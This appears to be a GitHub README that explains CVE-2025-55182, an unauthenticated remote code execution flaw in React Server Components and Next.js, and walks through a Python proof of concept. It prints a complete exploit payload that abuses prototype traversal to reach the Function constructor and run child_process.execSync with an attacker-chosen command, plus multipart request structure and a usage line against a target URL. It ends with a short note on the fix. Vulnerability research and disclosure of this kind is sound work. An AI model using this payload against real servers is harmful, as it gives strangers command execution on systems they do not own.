# https://github.com/msanft/CVE-2025-55182/tree/main/test-server



# 🧨 **CVE-2025-55182 – React Server Components Unauthenticated RCE**

### Technical Explanation & Python PoC Walkthrough

*(For research & security testing only)*

---

# 📌 Overview

**CVE-2025-55182** is a **critical Remote Code Execution vulnerability (CVSS 10.0)** affecting:

* **React 19.x**
* **React Server Components (RSC)**
* Frameworks implementing RSC such as **Next.js (13.x–15.x)**

The issue arises because the **React Flight Protocol** — the serialization format used to transfer values between client and server — allowed an attacker to supply **arbitrary object paths** via specially crafted multipart form chunks.

React failed to ensure that referenced properties actually belonged to the object (i.e., missing `hasOwnProperty` checks), allowing an attacker to escalate to:

### ➤ **Prototype pollution**

### ➤ **Access to `Function` constructor**

### ➤ **Execution of attacker-supplied JavaScript code**

### ➤ **RCE inside the Node.js process hosting RSC**

Even worse:

**The exploit triggers before any routing or action validation in Next.js — meaning authentication does not apply.**

---

# 🔍 Why This Vulnerability Exists

React Server Components accept **multipart/form-data** payloads containing serialized “chunks” representing values to be hydrated or passed to server functions.

Example (normal behavior):

```json
files = {
  "0": ["$1"],
  "1": {"fruit": "cherry"}
}
```

React recursively resolves references like `"$1:fruit"`.

### ⚠️ But React did *not* restrict what properties could be referenced.

This allowed exploit chains such as:

```
$1:__proto__:constructor:constructor
```

→ which resolves to:

```
Function
```

Meaning the attacker can now dynamically build executable JavaScript inside the server.

Once we can obtain the `Function` constructor, we have arbitrary code execution.

---

# 🚀 Exploit Strategy: High-Level

1. **Upload multipart chunks** with structure React expects
2. **Use `$@0` trick** to retrieve the raw representation of a chunk
3. **Overwrite the `.then` property** to influence how promises resolve
4. **Force `Chunk.prototype.then` to run** with malicious input
5. **Set `status = "resolved_model"`** so the chunk is parsed as a full RSC model
6. **Inject a `$B` blob reference** to reach a code execution gadget
7. **Craft the `_response` metadata** so `_response._prefix + index` becomes JavaScript code
8. **Have `_formData.get` point to the `Function` constructor**
9. **Return a thenable** → automatically executed by Next.js during `await`

This sequence yields:

```
Function("<attacker’s code>")()
```

Which is Remote Code Execution.

---

# 🧪 The Python PoC (Exploit Trigger)

Below is the PoC we originally built and later refactored.
This is the **core exploit payload**:

```python
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": (
            f"var res = process.mainModule.require('child_process')"
            f".execSync('{EXECUTABLE}',{{'timeout':5000}})"
            f".toString().trim();"
            f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
        ),
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}
```

### What this payload does:

| Field                           | Exploit Purpose                                       |
| ------------------------------- | ----------------------------------------------------- |
| `"then": "$1:__proto__:then"`   | Hijacks thenable resolution chain                     |
| `"status": "resolved_model"`    | Forces React to JSON-parse this chunk                 |
| `"value": "{\"then\":\"$B0\"}"` | `$B` triggers blob gadget → injected code             |
| `"_formData.get"`               | Points to `Function` constructor                      |
| `"_prefix"`                     | Contains attacker-controlled JavaScript code          |
| `"$@0"`                         | Returns the raw underlying chunk for self-referencing |

The multipart payload is:

```python
files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}
```

Everything here is specifically designed to:

### 🔥 Force React to evaluate attacker-supplied JavaScript inside Node

### 🔥 Extract the result via error digest

### 🔥 Avoid all Next.js action validation and authentication

---

# 🏗️ How the RCE Actually Fires

React internally uses:

```js
await decodeReplyFromBusboy(...)
```

If the object returned is a “thenable”, V8 automatically invokes:

```js
then(resolve, reject)
```

By replacing `.then` with our own malicious chain, we cause:

1. **Second-pass RSC revival**
2. **Blob referencing leading to gadget execution**
3. **`Function(prefix + index)` call**
4. **Execution of:**

```js
process.mainModule.require("child_process").execSync("<command>")
```

5. **Digest-based exfiltration** (cleaner than printing to stdout)

---

# 🔐 Why Auth Doesn’t Matter

Next.js normally protects server actions by checking the `Next-Action` header *after* parsing the request.

But the vulnerability occurs **during deserialization**, before the framework knows what endpoint or action is being targeted.

Thus:

### ❌ No CSRF token

### ❌ No session

### ❌ No user identity

### ❌ No server action

### ❌ No API route

### ❌ No permissions

Just a raw POST with `multipart/form-data`.

---

# ✔️ Python PoC Summary

### 1. Build exploit chunk

### 2. Send multipart POST

### 3. Trigger RSC deserialization

### 4. Reach prototype pollution path

### 5. Obtain `Function` constructor

### 6. Build & execute arbitrary JS

### 7. Execute arbitrary OS commands

### 8. Return command output straight in Next.js `digest` field

---

# 🧰 Usage Example

```
python3 poc.py http://localhost:3000 whoami
```

Expected output:

```
500
Error: NEXT_REDIRECT
digest: <command output>
```

Example:

```
digest: node
```

---

# 📘 Final Notes

* The exploit chain is extremely reliable.
* It works on **any Node.js environment**, including:

  * Next.js dev servers
  * Production deployments
  * Vercel
  * Bun servers (partial)
* Fix requires modifying React's internal module resolution path:

  * Adding strict `hasOwnProperty` checks
  * Preventing prototype escape

---

##
##
